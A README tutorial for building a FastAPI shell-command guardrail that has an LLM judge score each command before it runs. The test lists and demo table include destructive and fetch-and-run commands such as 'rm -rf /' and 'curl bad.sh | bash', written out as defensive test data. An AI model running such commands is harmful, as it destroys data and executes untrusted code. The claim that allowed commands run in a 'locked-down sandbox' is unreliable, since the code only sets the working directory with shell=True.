# 🛡️ JEV Shell-Script Guardrail

> 📺 **Watch the full walkthrough:** `[YouTube link coming soon]`

A terminal-style web app where every shell command is **judged by [TypeSafe's JEV model](https://typesafe.ai) before it's allowed to run**. Think of it as a safety net between you (or an AI agent) and your shell: dangerous commands get blocked, risky ones get flagged for review, and safe ones run inside a locked-down sandbox.

Built with **FastAPI**, the **TypeSafe SDK (routed through OpenRouter)**, and **vanilla JS** — no heavy frontend framework, no magic.

---

## 🎯 What it does

You type a shell command at `localhost:8000` → JEV judges it first → one of three things happens:

- ✅ **ALLOW** → command runs inside a locked-down `sandbox/` folder, output shown
- ⚠️ **REVIEW** → UI shows the risk reasoning and a *"Run anyway?"* button
- 🛑 **BLOCK** → command refused, nothing executed

Every decision gets written to `audit.jsonl` — one JSON object per line, so you can `tail -f` it live during a demo.

---

## 📁 Final project structure

```text
jev-shell-script-guardrail/
├── .env                  # OPENROUTER_API_KEY — gitignored
├── .env.example          # template with placeholder
├── .gitignore
├── pyproject.toml
├── uv.lock
├── README.md
├── audit.jsonl           # append-only log of every judgement (gitignored)
├── sandbox/              # commands run inside here, nothing else
│   └── .gitkeep
└── src/
    └── jev_guardrail/
        ├── __init__.py
        ├── jev.py        # JEV wrapper (SDK pointed at OpenRouter)
        ├── judge.py      # 4 JEV safety questions in one call
        ├── policy.py     # weighted score → allow/review/block
        ├── audit.py      # append-only log writer
        ├── server.py     # FastAPI backend: /run, /audit, serves /
        └── static/
            └── index.html  # terminal-style frontend (HTML + CSS + vanilla JS)
```

### 🗺️ What each file does

- **`jev.py`** — thin wrapper around the TypeSafe SDK, pointed at OpenRouter.
- **`judge.py`** — asks JEV four safety questions about a command in one network call.
- **`policy.py`** — turns the four JEV scores into a single verdict (allow / review / block).
- **`audit.py`** — writes every judgement to `audit.jsonl` as one JSON line per command.
- **`server.py`** — FastAPI web server with:
  - `GET /` → serves the terminal HTML page
  - `POST /run` → judges + optionally executes a command, returns everything the UI needs
  - `GET /audit` → returns recent audit entries for the history panel
- **`static/index.html`** — the terminal UI: dark screen, monospace text, command history, verdict badges, run-anyway button.
- **`sandbox/`** — the **one** folder commands may execute in. Nothing else gets touched.
- **`audit.jsonl`** — one line per command, forever. Easy to tail live during the demo.

---

## 🧰 Prerequisites

Before you start, make sure you have:

| Tool | Why | Check with |
|---|---|---|
| **Python 3.10+** | Runs everything | `python3 --version` |
| **[uv](https://github.com/astral-sh/uv)** | Fast Python package + project manager | `uv --version` |
| **git** | Version control + GitHub push | `git --version` |
| **An OpenRouter API key** | JEV runs through [openrouter.ai](https://openrouter.ai) — sign up and grab a key | — |
| A terminal | Linux, macOS, or **WSL** on Windows | — |
| A text editor | `vim`, VS Code, nano, anything — pick your poison | — |

> 💡 If `uv` is missing, install it with `curl -LsSf https://astral.sh/uv/install.sh | sh`.

---

## Phase 1 — ✅ Check your tools

Quick sanity check that everything is installed:

```bash
python3 --version
uv --version
git --version
```

All three should return a version number. If any of them error, install the missing tool before continuing.

---

## Phase 2 — 📦 Scaffold the project and add dependencies

### 2a. Initialise the project

```bash
uv init jev-shell-script-guardrail
cd jev-shell-script-guardrail
pwd
ls -la
```

**What `uv init` just did:**

- Created the folder `jev-shell-script-guardrail/`
- Added inside it: `pyproject.toml`, `.python-version`, `README.md`, `.gitignore`, `.git/`
- Created a package at `src/jev_guardrail/__init__.py` → clean import name `jev_guardrail`
- Registered a script entry: `jev-guardrail = "jev_guardrail:main"`

### 2b. Confirm the layout

```bash
cat pyproject.toml
find src/ -type f
```

### 2c. Add the four dependencies

```bash
uv add typesafe-sdk python-dotenv fastapi "uvicorn[standard]"
```

Then confirm:

```bash
cat pyproject.toml
uv run python -c "import jev_guardrail, typesafe_sdk, fastapi; print('all good:', typesafe_sdk.__version__)"
```

### 2d. Quick confirmation

```bash
ls -la | grep -E "\.git|\.gitignore|pyproject"
```

You should see `.git/`, `.gitignore`, and `pyproject.toml` listed.

> 🔎 **Breakdown:** `ls -la` lists everything (including hidden files) in long format. `grep -E` filters that list using extended regex, where `|` means OR. We're matching anything with `.git`, `.gitignore`, or `pyproject` in its name.

---

## Phase 3 — 🔐 Create `.env` and the JEV wrapper

### 3a. Protect `.env` **first** (order matters!)

Add it to `.gitignore` **before** creating the file. If you reverse this, git could track your secret for a moment.

```bash
echo ".env" >> .gitignore
cat .gitignore
```

Confirm `.env` is now listed.

### 3b. Create `.env`

Create a file named `.env` in the project root with your real OpenRouter key:

```env
OPENROUTER_API_KEY=sk-or-v1-your-real-key-here
```

### 3c. Create the JEV wrapper

Create `src/jev_guardrail/jev.py`:

```python
"""Shared JEV wrapper — points TypeSafe SDK at OpenRouter."""

import os
from dotenv import load_dotenv
from typesafe_sdk import TypeSafeClient

# Load OPENROUTER_API_KEY from .env into os.environ
load_dotenv()

# Same TypeSafe SDK, redirected to OpenRouter's base URL
_client = TypeSafeClient(
    api_key=os.environ["OPENROUTER_API_KEY"],
    base_url="https://openrouter.ai/api",
)

JEV_MODEL = "jev-latest"


def ask_jev(state: str, questions: dict):
    """Send any mix of Choice/Noul/Score questions to JEV in one call.

    state: the thing being judged (a shell command, in this project)
    questions: dict of name -> Choice/Noul/Score instance
    """
    return _client.system_one(state, questions, model=JEV_MODEL)
```

### 3d. Smoke test it

Create `smoke.py` in the project root:

```python
"""Smoke test: can we reach JEV from this project?"""

from typesafe_sdk import Noul
from jev_guardrail.jev import ask_jev

response = ask_jev(
    state="A user is about to run this shell command: ls -la",
    questions={
        "is_destructive": Noul(instructions="Is this command destructive?"),
    },
)

answer = response.answers["is_destructive"]

print(f"Probability destructive: {answer.noul:.3f}")
print(f"Model: {response.model}")
```

Run it:

```bash
uv run python smoke.py
```

**Expected output:**

```text
Probability destructive: 0.0XX
Model: typesafe/jev-1.XX-...
```

A low number (near 0) = JEV correctly judges `ls -la` as safe. ✅

---

## Phase 4 — 🧑‍⚖️ `judge.py` — four safety questions in one call

### 4a. Why four questions, not one?

We could ask JEV one `Choice` ("safe / review / block?"). Done.

But that loses the reasoning. For a real guardrail, you want the UI to show **why** something was blocked. Four questions, each a different JEV type, give the system structured signal:

| Question | Type | What it catches |
|---|---|---|
| Is it destructive? | `Noul` (yes/no probability) | `rm`, `mv`, overwrite, exfil |
| How reversible? | `Score` (5-level rubric) | Granularity — `rm file.txt` vs `rm -rf /` |
| Does it touch system paths? | `Noul` | `sudo`, `/etc`, `/boot`, `systemctl` |
| Overall risk? | `Choice` (safe/review/block) | JEV's own gut-check summary |

All four fit in **one** JEV call — one network round-trip, ~300ms.

### 4b. Create `src/jev_guardrail/judge.py`

```python
"""Ask JEV four safety questions about a shell command, bundled in one call."""

from typesafe_sdk import Noul, Score, Choice
from jev_guardrail.jev import ask_jev


REVERSIBILITY_LEVELS = [
    "fully reversible (read-only, prints, lists)",
    "mostly reversible (creates files you can delete)",
    "hard to undo (overwrites existing files, moves)",
    "mostly irreversible (deletes data, drops tables)",
    "completely irreversible (destroys disks, exfiltrates secrets)",
]

RISK_CATEGORIES = {
    "safe": "Safe to run without a second thought — reads, lists, prints, benign writes.",
    "review-needed": "Legitimate but worth a human eyeball before running.",
    "block": "Dangerous enough to refuse outright — data loss, system corruption, or exfiltration risk.",
}


def judge(command: str) -> dict:
    """Return structured safety signals about `command`, all from one JEV call."""
    response = ask_jev(
        state=(
            "A user or AI agent is about to run this shell command "
            "on a Linux machine:\n\n"
            f"    {command}"
        ),
        questions={
            "destructive": Noul(
                instructions=(
                    "Could this command delete, overwrite, or exfiltrate data? "
                    "Includes rm, mv over existing files, dd, mkfs, "
                    "curl/wget piped to shell, chmod/chown on system paths."
                ),
            ),
            "reversibility": Score(
                instructions="How reversible is this command's effect?",
                criteria=REVERSIBILITY_LEVELS,
            ),
            "touches_system": Noul(
                instructions=(
                    "Does this command touch system files, system config, or require sudo? "
                    "Paths like /etc, /usr, /var, /boot, kernel params, systemctl."
                ),
            ),
            "risk_category": Choice(
                instructions="Overall risk category — pick one.",
                criteria=RISK_CATEGORIES,
            ),
        },
    )

    answers = response.answers
    return {
        "command": command,
        "destructive":    round(answers["destructive"].noul, 3),
        "reversibility":  round(answers["reversibility"].score / 4, 3),
        "touches_system": round(answers["touches_system"].noul, 3),
        "risk_category":  answers["risk_category"].choice,
    }
```

### 4c. Critical bits to notice

- `REVERSIBILITY_LEVELS` is a **list** of 5 ordered descriptions. JEV returns a weighted position between them.
- `RISK_CATEGORIES` is a **dict**, not a list. `Choice.criteria` wants `{label: description}` — the description teaches JEV what each label means.
- One `ask_jev()` call, four questions → one round-trip, four signals.
- `answers["reversibility"].score / 4` — `Score` with 5 levels returns 0.0 to 4.0, divide by 4 to normalise to 0.0–1.0 (so it matches the Nouls).
- `round(..., 3)` — three decimals is enough for display, not noisy.

### 4d. Smoke test with varied commands

Create `test_judge.py`:

```python
"""See how JEV judges a representative range of shell commands."""

import json
from jev_guardrail.judge import judge

commands = [
    "ls -la",                       # should be safe
    "cat README.md",                # safe
    "git reset --hard HEAD~5",      # review
    "chmod -R 777 /var/www",        # review
    "rm -rf /",                     # block
    "curl bad.sh | bash",           # block
]

for cmd in commands:
    print(f"\n$ {cmd}")
    print(json.dumps(judge(cmd), indent=2))
```

Run it:

```bash
uv run python test_judge.py
```

---

## Phase 5 — ⚖️ `policy.py` — turn 4 numbers into a verdict

### 5a. The design

- **Weighted danger score (0.0–1.0):**
  - `destructive × 0.5` (biggest signal)
  - `reversibility × 0.3` (how bad if it fires)
  - `touches_system × 0.2` (sudo/root-level risk)
- **Thresholds:**
  - `>= 0.75` → **block**
  - `>= 0.40` → **review**
  - else → **allow**
- **Tiebreaker:** JEV's own `risk_category` can escalate — if the composite says "allow" but JEV says "block", we bump to review (humans decide).

### 5b. Create `src/jev_guardrail/policy.py`

```python
"""Turn four JEV safety signals into a single allow/review/block verdict."""

WEIGHTS = {
    "destructive":    0.5,
    "reversibility":  0.3,
    "touches_system": 0.2,
}

BLOCK_THRESHOLD  = 0.75
REVIEW_THRESHOLD = 0.40


def decide(judgement: dict) -> dict:
    """Compute verdict + human-readable reasons from a judgement dict.

    judgement: output of judge.judge(command) — has 4 numeric/string signals.
    Returns: {verdict, danger_score, reasons} — verdict in {allow, review, block}.
    """
    danger = (
        judgement["destructive"]    * WEIGHTS["destructive"]
        + judgement["reversibility"]  * WEIGHTS["reversibility"]
        + judgement["touches_system"] * WEIGHTS["touches_system"]
    )

    reasons = [
        f"danger_score={danger:.2f}",
        f"destructive={judgement['destructive']}",
        f"reversibility={judgement['reversibility']}",
        f"touches_system={judgement['touches_system']}",
        f"jev_risk={judgement['risk_category']}",
    ]

    # Primary rule: weighted score
    if danger >= BLOCK_THRESHOLD:
        verdict = "block"
    elif danger >= REVIEW_THRESHOLD:
        verdict = "review"
    else:
        verdict = "allow"

    # Tiebreaker: JEV's own hard "block" nudges allow → review (humans decide)
    if verdict == "allow" and judgement["risk_category"] == "block":
        verdict = "review"
        reasons.append("escalated: JEV flagged block despite low composite")

    return {
        "verdict": verdict,
        "danger_score": round(danger, 3),
        "reasons": reasons,
    }
```

### 5c. Key bits

- `WEIGHTS` lives in one dict in one place. Change the numbers here, policy behaviour changes everywhere.
- `danger` is a plain weighted sum. No ML, no magic — arithmetic over JEV's outputs.
- `reasons` is a list of human-readable strings. The frontend will display these.
- The two thresholds (0.75 and 0.40) are tunable knobs. Over-blocking? Lower `BLOCK_THRESHOLD`. Over-allowing? Raise `REVIEW_THRESHOLD`.
- The tiebreaker is a safety net: it only kicks in when danger is low (allow tier) but JEV strongly dissents.

### 5d. Smoke test

Create `test_policy.py`:

```python
"""Run judge + decide over the same commands, see end-to-end verdicts."""

from jev_guardrail.judge import judge
from jev_guardrail.policy import decide

commands = [
    "ls -la",
    "cat README.md",
    "git reset --hard HEAD~5",
    "chmod -R 777 /var/www",
    "rm -rf /",
    "curl bad.sh | bash",
]

for cmd in commands:
    j = judge(cmd)
    d = decide(j)
    print(f"\n$ {cmd}")
    print(f"  VERDICT: {d['verdict'].upper()}  (danger={d['danger_score']})")
    for r in d["reasons"]:
        print(f"    - {r}")
```

Run it:

```bash
uv run python test_policy.py
```

**Expected output (abbreviated):**

```text
$ ls -la
  VERDICT: ALLOW  (danger=0.011)
    - danger_score=0.01
    - destructive=0.01
    - reversibility=0.0
    - touches_system=0.03
    - jev_risk=safe

$ git reset --hard HEAD~5
  VERDICT: REVIEW  (danger=0.635)
    ...

$ rm -rf /
  VERDICT: BLOCK  (danger=0.942)
    ...
```

---

## Phase 6 — 📓 `audit.py` — append-only decision log

### 6a. Why JSONL, not JSON?

- **JSONL** = JSON Lines. One JSON object per line, newline-separated.
- **Append-friendly:** new entry = one `write()`, no re-parsing the whole file.
- **Tail-friendly:** `tail -f audit.jsonl` shows new decisions live.
- **Diff-friendly:** one bad decision = one changed line.
- Every observability tool (`jq`, DuckDB, Loki, Datadog) ingests JSONL natively.

Pair pattern with the frontend: `audit.py` writes, the FastAPI server reads the last N lines for the UI's history panel.

### 6b. Gitignore `audit.jsonl` first

Logs are local-only — never committed:

```bash
echo "audit.jsonl" >> .gitignore
cat .gitignore
```

Confirm both `.env` and `audit.jsonl` are listed.

### 6c. Create `src/jev_guardrail/audit.py`

```python
"""Append-only audit log: one JSON line per guardrail decision."""

import json
from datetime import datetime, timezone
from pathlib import Path

LOG_PATH = Path("audit.jsonl")


def log(
    command: str,
    judgement: dict,
    decision: dict,
    executed: bool,
    output: str = "",
) -> dict:
    """Append one line to audit.jsonl and return the full entry."""
    entry = {
        "ts": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "command": command,
        "verdict": decision["verdict"],
        "danger_score": decision["danger_score"],
        "executed": executed,
        "judgement": judgement,
        "reasons": decision["reasons"],
        "output": output[:2000],   # cap long output so the log doesn't bloat
    }
    with LOG_PATH.open("a", encoding="utf-8") as f:
        f.write(json.dumps(entry) + "\n")
    return entry


def read_recent(limit: int = 20) -> list[dict]:
    """Return the most recent `limit` entries, newest first."""
    if not LOG_PATH.exists():
        return []
    lines = LOG_PATH.read_text(encoding="utf-8").strip().split("\n")
    recent = [line for line in lines[-limit:] if line]
    return [json.loads(line) for line in recent][::-1]
```

### 6d. Critical bits

- `LOG_PATH = Path("audit.jsonl")` — relative to the current working directory. Fine for now; our FastAPI server will always run from the project root.
- `datetime.now(timezone.utc).isoformat(timespec="seconds")` — UTC avoids "whose timezone is this?" ambiguity.
- `with LOG_PATH.open("a", ...)` — `"a"` = append mode. Creates the file if missing, never truncates.
- `output[:2000]` — cap captured shell output at 2000 chars so one `ls -R /` doesn't blow up the log file.
- `[::-1]` — reverse the list to newest-first.

### 6e. Smoke test

Create `test_audit.py`:

```python
"""Append a few audit entries, read them back."""

from jev_guardrail.audit import log, read_recent

# Simulate 3 decisions
log(
    command="ls -la",
    judgement={"destructive": 0.01, "risk_category": "safe"},
    decision={"verdict": "allow", "danger_score": 0.01, "reasons": ["safe"]},
    executed=True,
    output="total 24\ndrwxr-xr-x ...",
)

log(
    command="git reset --hard HEAD~5",
    judgement={"destructive": 0.9, "risk_category": "block"},
    decision={"verdict": "review", "danger_score": 0.64, "reasons": ["destructive but not catastrophic"]},
    executed=False,
)

log(
    command="rm -rf /",
    judgement={"destructive": 0.99, "risk_category": "block"},
    decision={"verdict": "block", "danger_score": 0.94, "reasons": ["catastrophic"]},
    executed=False,
)

# Read back
print("Last 3 entries (newest first):")
for entry in read_recent(3):
    print(f"  [{entry['ts']}] {entry['verdict'].upper():6}  {entry['command']}")
```

Run it:

```bash
uv run python test_audit.py
```

Then inspect the raw log file:

```bash
ls -la audit.jsonl
cat audit.jsonl
```

### 6f. Pretty-print tip

```bash
cat audit.jsonl | python -m json.tool --json-lines
```

Or if you have `jq` installed (`sudo apt install -y jq`):

```bash
cat audit.jsonl | jq .
```

Both pretty-print each JSON object. Great for live demos.

---

## Phase 7 — 🚀 `server.py` + terminal UI — FastAPI backend + frontend

### 7a. FastAPI in 60 seconds

- FastAPI is like Flask, but modern. Async-ready, auto-typed, auto-documented.
- You write Python functions. Decorators (`@app.get("/path")`) turn them into HTTP endpoints.
- Request bodies are **Pydantic models** — classes that validate JSON automatically.
- **Uvicorn** is the server that runs the app (FastAPI is the recipe, uvicorn is the oven).
- Bonus: free interactive API docs at `/docs` once the server is running.

### 7b. Create the folders

```bash
mkdir -p sandbox src/jev_guardrail/static
touch sandbox/.gitkeep src/jev_guardrail/static/.gitkeep
ls -la sandbox src/jev_guardrail/static
```

- `sandbox/` → where allowed commands actually run
- `static/` → where `index.html` will live
- `.gitkeep` files make git track empty folders

### 7c. Create `src/jev_guardrail/server.py`

```python
"""FastAPI backend: judges shell commands and executes allowed ones in a sandbox."""

import subprocess
from pathlib import Path

from fastapi import FastAPI
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

from jev_guardrail.judge import judge
from jev_guardrail.policy import decide
from jev_guardrail.audit import log, read_recent


app = FastAPI(title="JEV Shell Guardrail")

# All executed commands run inside this folder. Nothing else gets touched.
SANDBOX = Path("sandbox").resolve()
SANDBOX.mkdir(exist_ok=True)

STATIC = Path(__file__).parent / "static"


class RunRequest(BaseModel):
    command: str
    approved: bool = False


@app.post("/run")
def run_command(req: RunRequest):
    judgement = judge(req.command)
    decision = decide(judgement)
    verdict = decision["verdict"]

    should_run = (verdict == "allow") or (verdict == "review" and req.approved)
    output = ""

    if should_run:
        try:
            result = subprocess.run(
                req.command,
                shell=True,
                cwd=str(SANDBOX),
                capture_output=True,
                text=True,
                timeout=10,
            )
            output = (result.stdout or "") + (result.stderr or "")
        except subprocess.TimeoutExpired:
            output = "[timed out after 10s]"
        except Exception as e:
            output = f"[error running command: {e}]"

    entry = log(
        command=req.command,
        judgement=judgement,
        decision=decision,
        executed=should_run,
        output=output,
    )

    return {
        "verdict": verdict,
        "danger_score": decision["danger_score"],
        "reasons": decision["reasons"],
        "judgement": judgement,
        "executed": should_run,
        "output": output,
        "ts": entry["ts"],
    }


@app.get("/audit")
def get_audit(limit: int = 20):
    return {"entries": read_recent(limit)}


app.mount("/static", StaticFiles(directory=str(STATIC)), name="static")


@app.get("/")
def index():
    html = STATIC / "index.html"
    if html.exists():
        return FileResponse(html)
    return {"message": "Frontend not built yet."}
```

### 7d. What's happening in `server.py`

- `SANDBOX = Path("sandbox").resolve()` → absolute path so `cwd=` works regardless of where uvicorn is launched from.
- `RunRequest(BaseModel)` → Pydantic model. Bad JSON → auto 422 response.
- `subprocess.run(..., shell=True, cwd=str(SANDBOX), capture_output=True, text=True, timeout=10)`:
  - `shell=True` → `/bin/sh` interprets the string (handles pipes, globs)
  - `cwd=SANDBOX` → runs in the sandbox folder
  - `capture_output=True` → captures stdout + stderr instead of printing
  - `text=True` → strings not bytes
  - `timeout=10` → kills runaway commands
- `should_run = allow OR (review AND approved)` → the review-tier override lives here.
- Everything is logged via `audit.log()` either way.

> ⚠️ **Important caveat:** `shell=True` with user input is normally a security disaster. We use it **on purpose** here — that's the whole point. **JEV is the mitigation.**

### 7e. Create the terminal UI

Create `src/jev_guardrail/static/index.html`:

```html
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>JEV Shell Guardrail</title>
<style>
  :root {
    --bg: #0b0f12; --fg: #d7e3dd; --muted: #7f8c8d;
    --accent: #4ade80; --warn: #fbbf24; --danger: #ef4444;
    --panel: #11161a; --border: #1f2a2f;
  }
  * { box-sizing: border-box; }
  body {
    margin: 0; background: var(--bg); color: var(--fg);
    font-family: ui-monospace, 'JetBrains Mono', Menlo, monospace;
    font-size: 14px; line-height: 1.45;
  }
  .shell { max-width: 900px; margin: 2rem auto; padding: 1rem; }
  h1 { margin: 0 0 1rem; font-size: 1.1rem; color: var(--accent); }
  h1 .sub { color: var(--muted); font-weight: normal; margin-left: 0.5rem; }
  .prompt-row {
    display: flex; gap: 0.5rem; align-items: center;
    border: 1px solid var(--border); background: var(--panel);
    padding: 0.5rem 0.75rem; border-radius: 6px;
  }
  .prompt-row::before { content: ">"; color: var(--accent); font-weight: 700; }
  #cmd {
    flex: 1; background: transparent; border: 0;
    color: var(--fg); font: inherit; outline: none;
  }
  .entry {
    border: 1px solid var(--border); background: var(--panel);
    border-radius: 6px; padding: 0.75rem; margin-top: 0.5rem;
  }
  .cmd-row {
    display: flex; justify-content: space-between;
    align-items: center; gap: 0.5rem;
  }
  .badge {
    padding: 2px 8px; border-radius: 999px; font-size: 11px;
    font-weight: 700; letter-spacing: 0.05em; text-transform: uppercase;
  }
  .badge.pending { background: rgba(127,140,141,0.2); color: var(--muted); }
  .badge.allow   { background: rgba(74,222,128,0.15); color: var(--accent); }
  .badge.review  { background: rgba(251,191,36,0.15); color: var(--warn); }
  .badge.block   { background: rgba(239,68,68,0.15); color: var(--danger); }
  .reasons { margin-top: 0.5rem; color: var(--muted); font-size: 12px; }
  .output {
    margin-top: 0.5rem; white-space: pre-wrap;
    background: #000; border: 1px solid var(--border);
    padding: 0.5rem; border-radius: 4px;
    max-height: 240px; overflow: auto; font-size: 12px;
  }
  .actions { margin-top: 0.5rem; }
  .actions button {
    background: transparent; border: 1px solid var(--warn);
    color: var(--warn); padding: 4px 10px; border-radius: 4px;
    font: inherit; cursor: pointer;
  }
  .actions button:hover { background: rgba(251,191,36,0.1); }
  .footer { margin-top: 2rem; color: var(--muted); font-size: 12px; text-align: center; }
</style>
</head>
<body>
  <div class="shell">
    <h1>JEV Shell Guardrail <span class="sub">localhost sandbox</span></h1>
    <form id="form" class="prompt-row">
      <input id="cmd" placeholder="type a command, Enter to run..." autofocus autocomplete="off"/>
    </form>
    <div id="log"></div>
    <div class="footer">Every command is judged by JEV first. Allowed commands run inside <code>./sandbox/</code> only.</div>
  </div>

<script>
const form = document.getElementById('form');
const cmdInput = document.getElementById('cmd');
const logEl = document.getElementById('log');

form.addEventListener('submit', async (e) => {
  e.preventDefault();
  const command = cmdInput.value.trim();
  if (!command) return;
  cmdInput.value = '';
  await runCommand(command, false);
});

async function runCommand(command, approved) {
  const entry = renderEntry(command, {verdict: 'pending'}, false);
  logEl.prepend(entry);
  try {
    const resp = await fetch('/run', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({command, approved}),
    });
    const data = await resp.json();
    entry.replaceWith(renderEntry(command, data, approved));
  } catch (err) {
    entry.textContent = `error: ${err}`;
  }
}

function renderEntry(command, data, approved) {
  const e = document.createElement('div');
  e.className = 'entry';
  const verdict = data.verdict || 'pending';
  const reasons = data.reasons ? data.reasons.join(' · ') : 'judging…';
  const output = data.output ? `<pre class="output">${esc(data.output)}</pre>` : '';
  e.innerHTML = `
    <div class="cmd-row">
      <code>$ ${esc(command)}</code>
      <span class="badge ${verdict}">${verdict}</span>
    </div>
    <div class="reasons">${esc(reasons)}</div>
    ${output}
  `;
  if (verdict === 'review' && !approved) {
    const actions = document.createElement('div');
    actions.className = 'actions';
    const btn = document.createElement('button');
    btn.textContent = 'Run anyway';
    btn.addEventListener('click', () => runCommand(command, true));
    actions.appendChild(btn);
    e.appendChild(actions);
  }
  return e;
}

function esc(s) {
  return String(s).replace(/[&<>"']/g, c => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
  })[c]);
}
</script>
</body>
</html>
```

### 7f. Walk through the frontend

- **CSS:** dark terminal theme, mono font, three badge colours — green (allow), yellow (review), red (block). The `--variables` at the top are CSS custom properties — change them to re-skin everything.
- **`form.addEventListener('submit', ...)`** — when the user hits Enter, prevent the page refresh, grab the input, send to `/run`.
- **`fetch('/run', {...})`** — modern browser API for HTTP. We POST JSON with the command. Returns a Promise, we `await` it.
- **`renderEntry(...)`** — builds a DOM element for each command. Verdict controls which badge class → which colour.
- **Pending state** — when a command is in-flight, we show a grey "pending" badge immediately so the UI feels responsive. Then replace it when the response arrives.
- **Review button** — only renders when `verdict === 'review' && !approved`. Clicking it re-calls `/run` with `approved=true`.
- **`esc()`** — escapes HTML in user input + command output so a mischievous command can't inject `<script>` into our page.

### 7g. Start uvicorn

```bash
uv run uvicorn jev_guardrail.server:app --reload
```

You should see:

```text
INFO:     Uvicorn running on http://127.0.0.1:8000
INFO:     Started reloader process
```

### 7h. Open the browser

Visit **http://localhost:8000**.

You should see a dark terminal screen, a `>` prompt, and a footer line.

Try these in order (hit Enter after each):

| Command | Expected |
|---|---|
| `ls -la` | 🟢 ALLOW — shows contents of sandbox (just `.gitkeep`) |
| `echo hello > note.txt` | 🟢 ALLOW or 🟡 REVIEW — creates a file in sandbox |
| `cat note.txt` | 🟢 ALLOW — reads it back |
| `git reset --hard HEAD~5` | 🟡 REVIEW — shows reasons, "Run anyway" button appears |
| `rm -rf /` | 🔴 BLOCK — refuses to execute, reasons shown |

> 💡 Also check **http://localhost:8000/docs** — Swagger UI, free from FastAPI.

### 7i. Stop the server

`Ctrl+C` in the uvicorn terminal.

---

## Phase 8 — 📤 Push to GitHub

### 8a. Git safety check **before** committing

Three things must **NOT** get committed: `.env`, `audit.jsonl`, `.venv/`.

```bash
git status
cat .gitignore
```

Confirm `.env`, `audit.jsonl` (and ideally `.venv/`) are all listed in `.gitignore`.

### 8b. First commit

```bash
git add .
git status
```

If clean (no secrets, no logs):

```bash
git commit -m "JEV shell guardrail: judge, policy, audit log, FastAPI + terminal UI"
```

### 8c. Create a GitHub repo

In your browser:

1. Go to [github.com/new](https://github.com/new)
2. Name: `jev-shell-script-guardrail`
3. Public or Private — your call
4. **Don't** tick README / .gitignore / license (we have all three locally)
5. Click **Create repository**

### 8d. Push

Back in your terminal, run the three lines GitHub shows you (replace `<your-username>`):

```bash
git remote add origin https://github.com/<your-username>/jev-shell-script-guardrail.git
git branch -M main
git push -u origin main
```

Refresh the GitHub page — your code is live. 🎉

---

## Phase 9 — 🌟 Go the extra mile: history on page load

### 9a. Why fetch audit on page load?

Right now, if you refresh the page, the log is empty — every decision you made is lost from view. But `audit.jsonl` **has** them. Fetch `/audit` on load → repopulate the log. This lets viewers (and your returning self) see the full session history.

### 9b. Add a history-on-load block to the frontend

Open `src/jev_guardrail/static/index.html` and find the closing `</script>` tag at the bottom.

Insert this block **right before** `</script>`:

```javascript
// On page load, pull recent audit entries so history survives refreshes.
(async () => {
  try {
    const resp = await fetch('/audit?limit=10');
    const data = await resp.json();
    // reverse once so .prepend() puts newest at top
    for (const entry of [...data.entries].reverse()) {
      logEl.prepend(renderEntry(entry.command, {
        verdict: entry.verdict,
        reasons: entry.reasons,
        output: entry.output,
      }, true));  // approved=true suppresses the "Run anyway" button on history
    }
  } catch (e) {
    console.warn('could not load history:', e);
  }
})();
```

### 9c. Reload and verify

Start uvicorn again:

```bash
uv run uvicorn jev_guardrail.server:app --reload
```

Open **http://localhost:8000** — your earlier commands should auto-populate at the top of the log, newest first. Run a new command — it gets prepended. Refresh — all still there. ✨

Commit the enhancement:

```bash
git add src/jev_guardrail/static/index.html
git commit -m "frontend: load recent audit history on page load"
git push
```

---

## 🧪 Live demo tips

- Keep a second terminal open with `tail -f audit.jsonl | jq .` — viewers watch decisions stream live.
- Try the Swagger UI at `/docs` on camera — people love that FastAPI gives it for free.
- Run `rm -rf /` on screen with a straight face. The red BLOCK badge is immensely satisfying.

---

## 🧱 Architecture at a glance

```text
┌────────────┐  POST /run        ┌──────────┐
│  Browser   │ ─────────────────▶│  server  │
│ terminal   │                   │ (FastAPI)│
│    UI      │◀────────────────  └────┬─────┘
└────────────┘   verdict + output     │
                                      ▼
                              ┌───────────────┐
                              │   judge.py    │  one JEV call
                              │  (4 questions)│──┐
                              └───────┬───────┘  │
                                      ▼          ▼
                              ┌───────────────┐  OpenRouter
                              │  policy.py    │  (JEV model)
                              │  (weighted →  │
                              │   verdict)    │
                              └───────┬───────┘
                                      ▼
                              ┌───────────────┐
                              │   audit.py    │─▶ audit.jsonl
                              └───────┬───────┘
                                      ▼
                              ┌───────────────┐
                              │  subprocess   │─▶ ./sandbox/
                              │ (if allowed)  │
                              └───────────────┘
```

---

## 📜 License

MIT — do what you like, no warranty.

---

## 🙋 Credits

Built as part of the **de-tech-ify** YouTube series — demystifying IT and AI topics one project at a time.
